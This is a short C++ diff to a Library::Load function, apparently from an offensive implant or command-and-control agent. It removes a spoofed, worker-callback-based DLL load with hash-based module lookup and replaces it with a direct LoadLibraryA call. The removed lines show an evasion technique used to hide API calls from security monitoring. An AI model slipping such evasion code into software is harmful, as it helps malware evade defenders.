@@ -3,16 +3,7 @@
 auto DECLFN Library::Load(
     _In_ PCHAR LibName
 ) -> UPTR {
-
-    LOAD_CTX Context = { 
-        .LoadLibraryAPtr = (UPTR)Self->Krnl32.LoadLibraryA,
-        .LibraryName = (UPTR)LibName
-    };
-
-    Self->Spf->WorkCall( (UPTR)&Context, WkrLoadLibraryA );
-
-    return LdrLoad::Module( Hsh::Str<CHAR>( LibName ) );
-    // return (UPTR)Self->Krnl32.LoadLibraryA( LibName );
+    return (UPTR)Self->Krnl32.LoadLibraryA( LibName );
 }
 
 auto DECLFN Library::GetRnd( VOID ) -> PCHAR {
